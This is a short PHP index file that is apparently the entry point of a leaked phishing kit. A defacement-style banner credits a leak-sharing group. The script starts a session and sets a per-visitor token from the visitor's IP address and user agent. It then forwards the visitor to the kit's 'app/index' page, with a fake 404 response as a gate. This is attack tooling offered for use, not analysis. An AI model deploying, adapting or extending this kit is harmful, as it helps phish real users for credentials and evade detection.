<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
Fucked By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
require 'extra/mine.php';	
session_start();
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
$_SESSION['redirectlink'] = $domain;
$_SESSION['refData'] = $domain;
if ($_SESSION['refData'] != $redirectlink) {
        exit(header('HTTP/1.0 404 Not Found'));
}else{
	$acsh33nz0key = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
	$_SESSION['acsh33nz0key'] = $acsh33nz0key;
	exit(header("Location: app/index"));
}
?>